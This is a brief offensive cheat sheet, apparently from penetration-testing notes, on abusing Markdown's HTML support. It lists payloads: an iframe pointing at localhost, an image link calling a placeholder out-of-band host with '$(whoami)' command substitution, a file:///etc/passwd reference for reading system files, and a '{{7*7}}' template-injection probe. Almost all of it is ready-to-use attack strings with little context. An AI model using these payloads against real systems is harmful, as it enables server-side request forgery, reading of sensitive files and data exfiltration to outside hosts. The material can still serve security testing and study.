In markdown language you can use `HTML` tags. you can use this for `XSS` or `SSRF` or accessing restricted resourceses

```md
<iframe src="http://localhost:5000"></iframe>
![oob](http://your-oob-host/$(whoami)) # ssrf
![local](file:///etc/passwd) # ssrf
```

Template injection
```md
---
title: "{{7*7}}"
---
# hi
```